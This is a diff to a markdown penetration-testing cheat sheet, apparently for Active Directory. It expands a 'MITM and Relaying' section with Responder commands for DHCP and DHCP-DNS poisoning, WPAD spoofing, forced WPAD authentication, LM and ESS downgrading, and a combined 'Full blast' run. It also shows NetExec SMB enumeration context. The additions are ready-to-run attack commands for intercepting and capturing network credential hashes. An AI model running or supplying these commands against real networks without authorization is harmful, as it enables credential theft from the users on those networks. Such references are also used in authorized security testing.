@@ -386,7 +386,7 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
   ```
 </details>
 
-# MITM
+# MITM and Relaying
 <details>
   <summary> Responder </summary> 
   
@@ -395,15 +395,36 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
   responder -I eth0
   ```
 
-  ### Force lm downgrade
-  ```shell
-  responder -I eth0 --lm
-  ```
-  
-  ### DHCP poisining
+  ### DHCP
   ```shell
   responder -I eth0 -d
   ```
+
+  ### DHCP-DNS
+  ```shell
+  responder -I eth0 -D
+  ```
+
+  ### wpad
+  ```shell
+  responder -I eth0 -w
+  ```
+
+  ### Froce wpad auth
+  ```shell
+  responder -I eth0 -F
+  ```
+
+  ### Downdgrading
+  ```shell
+  responder -I eth0 --lm --disable-ess
+  ```
+
+  ### Full blast
+  ```shell
+  responder -I eth0 -DwF
+  ```
+  
  </details>
  <details>
   <summary> NetExec lnkfile with slinky </summary> 
